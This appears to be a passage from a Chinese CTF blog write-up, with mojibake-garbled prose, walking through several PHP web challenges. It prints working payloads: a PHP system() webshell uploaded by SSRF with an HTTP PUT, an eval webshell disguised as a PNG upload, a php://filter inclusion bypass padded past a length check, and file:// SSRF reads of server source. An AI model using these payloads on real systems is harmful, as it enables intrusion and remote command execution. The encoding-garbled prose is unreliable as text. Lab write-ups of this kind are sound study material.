<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br></code></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ç ä¼šè®©stream_context_createå‡½æ•°æ¥æ”¶postä¸Šæ¥çš„optionå‚æ•°</p>
<p>å…³é”®æ¥ç†è§£ä¸€ä¸‹è¿™ä»½payloadï¼š  </p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">action=view&amp;filename=http://127.0.0.1:5000/shell.php&amp;options[http][method]=PUT&amp;options[http][content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>åˆ©ç”¨viewæ“ä½œæ¥ç»•è¿‡uploadæ“ä½œçš„waf<br>æºç çš„æŸ¥çœ‹å›¾ç‰‡åˆ©ç”¨çš„æ˜¯ file_get_contents() æ”¯æŒhttpåè®®ï¼Œç”¨å®ƒæ¥è§¦å‘ssrfæ¥å‘dufs(æ–‡ä»¶æœåŠ¡å™¨æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œé€šè¿‡index.phpçš„æºç å¯ä»¥çŸ¥é“dufsæ–‡ä»¶æœåŠ¡è¿è¡Œåœ¨æœ¬åœ°5000ç«¯å£ä¸Š)ç›®å½•ç›´æ¥ä¸Šä¼ æ–‡ä»¶  </p>
<h2 id="options-http-method-PUT"><a href="#options-http-method-PUT" class="headerlink" title="options[http][method]&#x3D;PUT"></a><strong>options[http][method]&#x3D;PUT</strong></h2><p>ç”¨é€”ï¼šé€šè¿‡ PHP çš„ stream_context_create å‡½æ•°è‡ªå®šä¹‰ HTTP è¯·æ±‚çš„ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ã€‚</p>
<p>æ”»å‡»é€»è¾‘ï¼š</p>
<p>[method]&#x3D;PUTï¼šå°† HTTP è¯·æ±‚æ–¹æ³•ä»é»˜è®¤çš„ GET æ”¹ä¸º PUTã€‚</p>
<p>PUT æ–¹æ³•çš„ä½œç”¨ï¼šå‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ï¼ˆéœ€ç›®æ ‡æœåŠ¡æ”¯æŒï¼Œå¦‚ dufs å…è®¸ PUT ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚</p>
<p>ä¸ºä»€ä¹ˆé‡è¦ï¼šé€šè¿‡æ­¤å‚æ•°ç»•è¿‡å¸¸è§„æ–‡ä»¶ä¸Šä¼ é™åˆ¶ï¼Œç›´æ¥å†™å…¥æ–‡ä»¶ã€‚<br>é€šè¿‡ PHP çš„ stream_context_create å‡½æ•°è‡ªå®šä¹‰ HTTP è¯·æ±‚çš„ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰å°†åŸæ¥è¯·æ±‚çš„GETæ”¹ä¸ºPUTä»¥å‘dufsæœåŠ¡ä¸Šä¼ æœ¨é©¬  </p>
<h2 id="options-http-content-php-system-GET-â€˜aâ€™"><a href="#options-http-content-php-system-GET-â€˜aâ€™" class="headerlink" title="options[http][content]&#x3D;&lt; ?php system($_GET[â€˜aâ€™]);? &gt;"></a>options[http][content]&#x3D;&lt; ?php system($_GET[â€˜aâ€™]);? &gt;</h2><p>ç”¨é€”ï¼šè®¾ç½® HTTP è¯·æ±‚çš„ Body å†…å®¹ï¼ˆå³ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ï¼‰ã€‚</p>
<p>æ”»å‡»é€»è¾‘ï¼š</p>
<?php system($_GET['a']);?><p>ï¼šä¸€ä¸ªç®€çŸ­çš„ PHP Webshellã€‚</p>
<p>system()ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>$_GET[â€˜aâ€™]ï¼šä» URL å‚æ•° a ä¸­æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ã€‚</p>
<p>ä¾‹å¦‚ï¼šè®¿é—® <a target="_blank" rel="noopener" href="http://127.0.0.1:5000/shell.php?a=ls">http://127.0.0.1:5000/shell.php?a=ls</a> ä¼šæ‰§è¡Œ ls å‘½ä»¤ã€‚</p>
<p>å…³é”®ä½œç”¨ï¼šå°†æ¶æ„ä»£ç å†™å…¥æœåŠ¡å™¨çš„ shell.php æ–‡ä»¶ï¼Œä¸ºåç»­æ”»å‡»åšå‡†å¤‡ã€‚</p>
<h2 id="å®Œæ•´æ”»å‡»æµç¨‹"><a href="#å®Œæ•´æ”»å‡»æµç¨‹" class="headerlink" title="å®Œæ•´æ”»å‡»æµç¨‹"></a>å®Œæ•´æ”»å‡»æµç¨‹</h2><p>1.è§¦å‘ SSRF   </p>
<p>æœåŠ¡å™¨æ‰§è¡Œ file_get_contents æ—¶ï¼Œå°è¯•è¯»å– <a target="_blank" rel="noopener" href="http://127.0.0.1:5000/shell.php">http://127.0.0.1:5000/shell.php</a><br>ä½†å®é™…å‘èµ·çš„æ˜¯ä¸€ä¸ª PUT è¯·æ±‚ã€‚</p>
<p>2.ä¸Šä¼  Webshell</p>
<p>è¯·æ±‚å†…å®¹ä¸ºï¼š<br>æ­¤æ—¶ç”¨stream_context_createæ„å»ºçš„httpè¯·æ±‚åº”è¯¥å°±æ˜¯å¦‚ä¸‹äº†ï¼š  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/shell.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>PUTè¯·æ±‚å°†ä¼šå°†shell.phpå’Œå…¶æŒ‡å®šå†…å®¹å†™å…¥dufs  </p>
<p>å¦‚æœ dufs å…è®¸ PUT ä¸Šä¼ ï¼Œshell.php ä¼šè¢«å†™å…¥æœåŠ¡å™¨ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€ä¸ªoptionç”¨æ¥å®šä¹‰putçš„httpè¯·æ±‚ï¼Œç¬¬äºŒä¸ªoptionç”¨æ¥å®šä¹‰httpä¸»ä½“</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯èš‚èšè¿é©¬ç„¶åå†ç¯å¢ƒå˜é‡é‡Œçœ‹åˆ°flag</p>
<h2 id="stream-context-create"><a href="#stream-context-create" class="headerlink" title="stream_context_create"></a>stream_context_create</h2><p>stream_context_create æ˜¯ PHP ä¸­ç”¨äºåˆ›å»ºæµä¸Šä¸‹æ–‡ï¼ˆstream contextï¼‰çš„å‡½æ•°ï¼Œå®ƒå…è®¸å¼€å‘è€…åœ¨æ‰§è¡Œæ–‡ä»¶ã€ç½‘ç»œæˆ–å…¶ä»–æµæ“ä½œæ—¶ï¼Œè‡ªå®šä¹‰åº•å±‚åè®®çš„è¡Œä¸ºï¼ˆä¾‹å¦‚è®¾ç½® HTTP è¯·æ±‚å¤´ã€ä¿®æ”¹ FTP ä¼ è¾“æ¨¡å¼ç­‰ï¼‰ã€‚è¿™ä¸ªå‡½æ•°åœ¨å®ç°å¤æ‚ç½‘ç»œæ“ä½œæ—¶éå¸¸æœ‰ç”¨ï¼Œä½†å¦‚æœä½¿ç”¨ä¸å½“ï¼Œä¹Ÿå¯èƒ½å¼•å‘å®‰å…¨æ¼æ´ï¼ˆå¦‚ SSRFã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ç­‰ï¼‰ã€‚</p>
<p>æ•°çš„åŸºæœ¬è¯­æ³•:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">stream_context_create(array $options = ?,<span class="hljs-built_in"> array </span>$params = ?): resource<br></code></pre></td></tr></table></figure>
<p>å‚æ•°ï¼š</p>
<p>$optionsï¼šä¸€ä¸ªå¤šç»´æ•°ç»„ï¼Œç”¨äºé…ç½®ä¸åŒåè®®ï¼ˆå¦‚ httpã€ftpã€ssl ç­‰ï¼‰çš„è¡Œä¸ºã€‚</p>
<p>$paramsï¼ˆå¯é€‰ï¼‰ï¼šè®¾ç½®ä¸Šä¸‹æ–‡å‚æ•°ï¼ˆå¦‚è¶…æ—¶æ—¶é—´ï¼‰ã€‚</p>
<p>è¿”å›å€¼ï¼šè¿”å›ä¸€ä¸ªæµä¸Šä¸‹æ–‡èµ„æºï¼Œå¯ä¼ é€’ç»™å…¶ä»–æµæ“ä½œå‡½æ•°ï¼ˆå¦‚ file_get_contentsã€fopenï¼‰ã€‚</p>
<h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-easyupload3-0"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload3.0"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload3.0</h1><p>ä¼ æ­£å¸¸å›¾ç‰‡ï¼Œå¾—åˆ°è·¯å¾„<br>ç„¶åè¯•è¯•ç›´æ¥ä¼ ç ï¼Œä¸è¡Œ<br>ä¿®æ”¹è¯·æ±‚å¤´ï¼š </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>354<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryrWwjxZ6YBiFAz2Lm<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1748528050; HMACCOUNT=1B73E9281BD50EC7; PHPSESSID=fve350i8dhj45k2ls9htd4l6r5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;shell.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">è¿™ä¸ä¼ ä¸€ä¸ªğŸï¼Ÿ</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm--</span></span><br></code></pre></td></tr></table></figure>
<p>ç„¶åä¼ .htaccess</p>
<p>èš‚èšç›´æ¥è¿<br>envæŸ¥çœ‹ç¯å¢ƒçš„åˆ°flag</p>
<h1 id="é¹åŸæ¯-2022-ç®€å•åŒ…å«"><a href="#é¹åŸæ¯-2022-ç®€å•åŒ…å«" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•åŒ…å«"></a>[é¹åŸæ¯ 2022]ç®€å•åŒ…å«</h1><p>ä¸Šæ¥èƒ½çœ‹åˆ°ç»™å‡ºçš„æºç ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br><span class="hljs-comment">//flag in /var/www/html/flag.php;</span><br></code></pre></td></tr></table></figure>

<p>ç›´æ¥ä¼ å…¥flag&#x3D;flag.php<br>æç¤ºæœ‰waf<br>ä½¿ç”¨phpä¼ªåè®®ç»“æœä¸€æ ·<br>å°è¯•è¯»å–index.phpå®Œæ•´æºç <br>flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;code&gt;&lt;span style=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;<br>&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-keyword">__FILE__</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;);&lt;br /&gt;<span class="hljs-keyword">include</span>(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;<span class="hljs-string">&quot;flag&quot;</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #FF8000&quot;</span>&gt;<span class="hljs-comment">//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;</span><br>&lt;/span&gt;<br>&lt;/code&gt;&lt;br /&gt;<br></code></pre></td></tr></table></figure>

<p>çœ‹deepseekè§£é‡Š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>))<br></code></pre></td></tr></table></figure>
<p>å…¶ä¸­æœ‰&amp;&amp;æ•ˆæœä¸andç›¸åŒï¼Œè‹¥æ˜¯ä¸¤ä¸ªæ¡ä»¶è¾¾æˆå°±ä¼šæ‰§è¡Œif<br>å…¶ä¸­ç¬¬ä¸€æ¡æ˜¯è¯·æ±‚ä½“é•¿åº¦å°äº800ï¼Œç¬¬äºŒæ˜¯ä¼ å…¥ä¸­å«æœ‰flagå­—ç¬¦<br>åªè¦è®©å…¶ä¸­ä¸€æ¡ä¸ºå‡å°±èƒ½ç»•è¿‡waf<br>æ‰€ä»¥è®©postçš„è¯·æ±‚ä½“é•¿åº¦å¤§äº800å³å¯<br>ä¾‹å¦‚ï¼š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php&amp;a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure>

<h1 id="LitCTF-2025-easy-signin"><a href="#LitCTF-2025-easy-signin" class="headerlink" title="[LitCTF 2025]easy_signin"></a>[LitCTF 2025]easy_signin</h1><p>å¼€é¢˜å…ˆæ˜¯æ— æ³•è®¿é—®ï¼Œæ‰«ç›®å½•æ‰«å‡ºè¿™äº›ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[01:51:25] 301 -  169B  - /api  -&gt;  http://node6.anna.nssctf.cn/api/<br>[01:51:26] 301 -  169B  - /backup  -&gt;  http://node6.anna.nssctf.cn/backup/<br>[01:51:29] 302 -    0B  - /dashboard.php  -&gt;  /login.html<br>[01:51:34] 200 -    6KB - /login.html<br>[01:51:34] 200 -   51B  - /login.php<br></code></pre></td></tr></table></figure>
<p>è®¿é—®login.php<br>å›æ˜¾ï¼š</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">400</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>53c2<span class="hljs-char escape_">\u</span>6570<span class="hljs-char escape_">\u</span>4e0d<span class="hljs-char escape_">\u</span>5b8c<span class="hljs-char escape_">\u</span>6574&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
<p>è®¿é—®html<br>åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢  </p>
<p>æŠ“åŒ…å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°usernameå’Œpasswordæ˜¯md5åŠ å¯†è¿‡çš„</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>f6b57bb04015bf000f17e5d5dda37935<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-apache"><span class="hljs-attribute">username</span>=ee11cbb19052e40b07aac0ca060c23ee&amp;password=<span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&amp;timestamp=<span class="hljs-number">1748714891098</span></span><br></code></pre></td></tr></table></figure>
<p>å°è¯•å¯¹admin å¯†ç çˆ†ç ´æ²¡ç»“æœ<br>user å°è¯•ä¸€ç›´æç¤ºè´¦æˆ·é”™è¯¯æ²¡ç»“æœ<br>å»çœ‹wp<br>è¯´æ˜¯æœ‰apiå£èƒ½çŸ¥é“æœ‰åœ°æ–¹èƒ½ssrf  </p>
<p>æµè§ˆå™¨ä¸­f12æŸ¥çœ‹ç½‘ç»œå»å‘èƒ½çœ‹åˆ°ä¸€ä¸ªapiåœ°å€  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node6.anna.nssctf.cn:28934/api.js<br>è®¿é—®çœ‹åˆ°ï¼š<br>/api/sys/urlcode.php?url=<br></code></pre></td></tr></table></figure>
<p>ç„¶å  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">28934</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/login.php<br><br>çœ‹ä¸è§å“¦<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php">http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!?php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$url</span>)&#123;<br><br>    <span class="hljs-variable">$forbidden_protocols</span> = [<span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;zlib://&#x27;</span>, <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;glob://&#x27;</span>, <span class="hljs-string">&#x27;phar://&#x27;</span>, <span class="hljs-string">&#x27;ssh2://&#x27;</span>, <span class="hljs-string">&#x27;rar://&#x27;</span>, <span class="hljs-string">&#x27;ogg://&#x27;</span>, <span class="hljs-string">&#x27;expect://&#x27;</span>];<br>    <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">false</span>;<br>    <span 